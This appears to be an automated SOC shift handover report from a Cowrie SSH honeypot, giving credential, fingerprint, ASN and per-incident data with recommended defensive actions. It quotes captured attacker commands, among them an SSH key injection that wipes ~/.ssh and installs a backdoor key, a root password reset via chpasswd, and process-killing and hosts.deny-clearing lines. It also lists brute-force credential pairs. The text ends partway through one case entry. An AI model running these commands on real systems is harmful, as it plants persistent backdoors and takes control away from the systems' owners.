# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-28 |
| **Generated At** | 2026-05-28T20:28:57Z |
| **Shift Time** | 20:28 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **489** |
| Confirmed Threats | **478** |
| False Positives Filtered | **11** (2.2%) |
| Unique Attacker IPs | **30** |
| Countries of Origin | **17** |
| High Severity Cases | **22** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **467** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **53** |
| Unique Credential Pairs | **35** |
| Unique Usernames | **12** |
| Unique Passwords | **26** |
| Successful Auth Pairs | **16** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 22 |
| `345gs5662d34` | 10 |
| `admin` | 7 |
| `Admin` | 6 |
| `minecraft` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 10 |
| `3245gs5662d34` | 10 |
| `admin` | 3 |
| `<Any pass>` | 3 |
| `12345678` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 10 |
| `root` | `3245gs5662d34` | 10 |
| `minecraft` | `admin` | 1 |
| `mina` | `mina` | 1 |
| `root` | `223344` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `223344` | `101.36.111.119` | 2026-05-28T17:54:34 |
| `root` | `3245gs5662d34` | `101.36.111.119` | 2026-05-28T17:54:37 |
| `root` | `root1` | `101.36.111.119` | 2026-05-28T17:57:44 |
| `root` | `Passw0rd` | `101.36.111.119` | 2026-05-28T18:00:46 |
| `root` | `admin99` | `101.36.111.119` | 2026-05-28T18:02:22 |
| `root` | `aaaa1111` | `101.36.111.119` | 2026-05-28T18:04:02 |
| `root` | `Demo@123` | `101.36.111.119` | 2026-05-28T18:05:36 |
| `root` | `Abc123!!!` | `101.36.111.119` | 2026-05-28T18:08:53 |
| `root` | `<Any pass>` | `103.106.66.154` | 2026-05-28T18:57:21 |
| `root` | `P@ssw0rd!23` | `120.48.178.142` | 2026-05-28T19:01:37 |
| `root` | `admin@01` | `41.242.115.84` | 2026-05-28T19:10:13 |
| `root` | `3245gs5662d34` | `41.242.115.84` | 2026-05-28T19:10:19 |
| `root` | `test2024@` | `156.146.55.228` | 2026-05-28T19:11:50 |
| `root` | `3245gs5662d34` | `156.146.55.228` | 2026-05-28T19:11:56 |
| `root` | `P@ssw0rd99` | `103.89.136.111` | 2026-05-28T20:02:12 |
| `root` | `3245gs5662d34` | `103.89.136.111` | 2026-05-28T20:02:14 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **489** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 45 |
| OpenSSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 39 | 4 |
| `03a80b21afa8...` | Modern SSH client | 3 | 2 |
| `6ccf2f9e3e87...` | Mirai/variant | 3 | 1 |
| `bc9e7273cde2...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 39 | 4 | Mirai/variant |
| `03a80b21afa8...` | libssh | 3 | 2 | Modern SSH client |
| `6ccf2f9e3e87...` | libssh | 3 | 1 | Mirai/variant |
| `bc9e7273cde2...` | OpenSSH | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:JoXvOxJPqpnc"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.178.142`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `41.242.115.84`, `101.36.111.119`, `103.89.136.111`, `156.146.55.228`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **30** |
| Unique ASNs | **27** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS25369` | Hydra Communications Ltd | 2 | HIGH |
| `AS37613` | DOLPHIN TELECOMMUNICATION LIMITED | 1 | HIGH |
| `AS58821` | PT Lintas Jaringan Nusantara | 1 | HIGH |
| `AS398722` | Censys, Inc. | 1 | HIGH |
| `AS138423` | CMPak Limited | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (21)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-00fe96080fa2

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-28 17:54 |
| **Last Seen** | 2026-05-28 17:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 17:54:33` | `cowrie.session.connect` |
| `2026-05-28 17:54:33` | `cowrie.client.version` |
| `2026-05-28 17:54:33` | `cowrie.client.kex` |
| `2026-05-28 17:54:34` | `cowrie.login.success` |
| `2026-05-28 17:54:34` | `cowrie.session.params` |
| `2026-05-28 17:54:34` | `cowrie.command.input` |
| `2026-05-28 17:54:34` | `cowrie.command.failed` |
| `2026-05-28 17:54:34` | `cowrie.log.closed` |
| `2026-05-28 17:54:35` | `cowrie.session.params` |
| `2026-05-28 17:54:35` | `cowrie.command.input` |
| `2026-05-28 17:54:35` | `cowrie.session.file_download` |
| `2026-05-28 17:54:35` | `cowrie.log.closed` |
| `2026-05-28 17:54:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-374b49bcd3f1

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-28 17:54 |
| **Last Seen** | 2026-05-28 17:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 17:54:36` | `cowrie.session.connect` |
| `2026-05-28 17:54:36` | `cowrie.client.version` |
| `2026-05-28 17:54:37` | `cowrie.client.kex` |
| `2026-05-28 17:54:37` | `cowrie.login.success` |
| `2026-05-28 17:54:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-588e98e74f90

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-28 17:57 |
| **Last Seen** | 2026-05-28 17:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 17:57:43` | `cowrie.session.connect` |
| `2026-05-28 17:57:43` | `cowrie.client.version` |
| `2026-05-28 17:57:43` | `cowrie.client.kex` |
| `2026-05-28 17:57:44` | `cowrie.login.success` |
| `2026-05-28 17:57:44` | `cowrie.session.params` |
| `2026-05-28 17:57:44` | `cowrie.command.input` |
| `2026-05-28 17:57:44` | `cowrie.command.failed` |
| `2026-05-28 17:57:44` | `cowrie.log.closed` |
| `2026-05-28 17:57:44` | `cowrie.session.params` |
| `2026-05-28 17:57:44` | `cowrie.command.input` |
| `2026-05-28 17:57:44` | `cowrie.session.file_download` |
| `2026-05-28 17:57:44` | `cowrie.log.closed` |
| `2026-05-28 17:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-078c4507995e

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-28 17:57 |
| **Last Seen** | 2026-05-28 17:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 17:57:46` | `cowrie.session.connect` |
| `2026-05-28 17:57:46` | `cowrie.client.version` |
| `2026-05-28 17:57:46` | `cowrie.client.kex` |
| `2026-05-28 17:57:47` | `cowrie.login.success` |
| `2026-05-28 17:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28da91082dc3

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-28 18:00 |
| **Last Seen** | 2026-05-28 18:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 18:00:46` | `cowrie.session.connect` |
| `2026-05-28 18:00:46` | `cowrie.client.version` |
| `2026-05-28 18:00:46` | `cowrie.client.kex` |
| `2026-05-28 18:00:46` | `cowrie.login.success` |
| `2026-05-28 18:00:46` | `cowrie.session.params` |
| `2026-05-28 18:00:46` | `cowrie.command.input` |
| `2026-05-28 18:00:46` | `cowrie.command.failed` |
| `2026-05-28 18:00:47` | `cowrie.log.closed` |
| `2026-05-28 18:00:47` | `cowrie.session.params` |
| `2026-05-28 18:00:47` | `cowrie.command.input` |
| `2026-05-28 18:00:47` | `cowrie.session.file_download` |
| `2026-05-28 18:00:47` | `cowrie.log.closed` |
| `2026-05-28 18:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9abb3760d3ae

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-28 18:00 |
| **Last Seen** | 2026-05-28 18:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 18:00:49` | `cowrie.session.connect` |
| `2026-05-28 18:00:49` | `cowrie.client.version` |
| `2026-05-28 18:00:49` | `cowrie.client.kex` |
| `2026-05-28 18:00:49` | `cowrie.login.success` |
| `2026-05-28 18:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38ac988d60d3

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-28 18:02 |
| **Last Seen** | 2026-05-28 18:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 18:02:21` | `cowrie.session.connect` |
| `2026-05-28 18:02:21` | `cowrie.client.version` |
| `2026-05-28 18:02:22` | `cowrie.client.kex` |
| `2026-05-28 18:02:22` | `cowrie.login.success` |
| `2026-05-28 18:02:22` | `cowrie.session.params` |
| `2026-05-28 18:02:22` | `cowrie.command.input` |
| `2026-05-28 18:02:22` | `cowrie.command.failed` |
| `2026-05-28 18:02:22` | `cowrie.log.closed` |
| `2026-05-28 18:02:23` | `cowrie.session.params` |
| `2026-05-28 18:02:23` | `cowrie.command.input` |
| `2026-05-28 18:02:23` | `cowrie.session.file_download` |
| `2026-05-28 18:02:23` | `cowrie.log.closed` |
| `2026-05-28 18:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b102e9fddf5

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-28 18:02 |
| **Last Seen** | 2026-05-28 18:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 18:02:24` | `cowrie.session.connect` |
| `2026-05-28 18:02:24` | `cowrie.client.version` |
| `2026-05-28 18:02:25` | `cowrie.client.kex` |
| `2026-05-28 18:02:25` | `cowrie.login.success` |
| `2026-05-28 18:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21e75f069ef2

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-28 18:04 |
| **Last Seen** | 2026-05-28 18:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 18:04:01` | `cowrie.session.connect` |
| `2026-05-28 18:04:01` | `cowrie.client.version` |
| `2026-05-28 18:04:02` | `cowrie.client.kex` |
| `2026-05-28 18:04:02` | `cowrie.login.success` |
| `2026-05-28 18:04:02` | `cowrie.session.params` |
| `2026-05-28 18:04:02` | `cowrie.command.input` |
| `2026-05-28 18:04:02` | `cowrie.command.failed` |
| `2026-05-28 18:04:02` | `cowrie.log.closed` |
| `2026-05-28 18:04:03` | `cowrie.session.params` |
| `2026-05-28 18:04:03` | `cowrie.command.input` |
| `2026-05-28 18:04:03` | `cowrie.session.file_download` |
| `2026-05-28 18:04:03` | `cowrie.log.closed` |
| `2026-05-28 18:04:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e817f502579

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-28 18:04 |
| **Last Seen** | 2026-05-28 18:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 18:04:05` | `cowrie.session.connect` |
| `2026-05-28 18:04:05` | `cowrie.client.version` |
| `2026-05-28 18:04:05` | `cowrie.client.kex` |
| `2026-05-28 18:04:05` | `cowrie.login.success` |
| `2026-05-28 18:04:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cfee0537c3d

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-28 18:05 |
| **Last Seen** | 2026-05-28 18:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 18:05:36` | `cowrie.session.connect` |
| `2026-05-28 18:05:36` | `cowrie.client.version` |
| `2026-05-28 18:05:36` | `cowrie.client.kex` |
| `2026-05-28 18:05:36` | `cowrie.login.success` |
| `2026-05-28 18:05:36` | `cowrie.session.params` |
| `2026-05-28 18:05:36` | `cowrie.command.input` |
| `2026-05-28 18:05:36` | `cowrie.command.failed` |
| `2026-05-28 18:05:37` | `cowrie.log.closed` |
| `2026-05-28 18:05:37` | `cowrie.session.params` |
| `2026-05-28 18:05:37` | `cowrie.command.input` |
| `2026-05-28 18:05:37` | `cowrie.session.file_download` |
| `2026-05-28 18:05:37` | `cowrie.log.closed` |
| `2026-05-28 18:05:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18dc39616258

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-28 18:05 |
| **Last Seen** | 2026-05-28 18:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 18:05:39` | `cowrie.session.connect` |
| `2026-05-28 18:05:39` | `cowrie.client.version` |
| `2026-05-28 18:05:39` | `cowrie.client.kex` |
| `2026-05-28 18:05:39` | `cowrie.login.success` |
| `2026-05-28 18:05:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f889b65ae03

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-28 18:08 |
| **Last Seen** | 2026-05-28 18:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
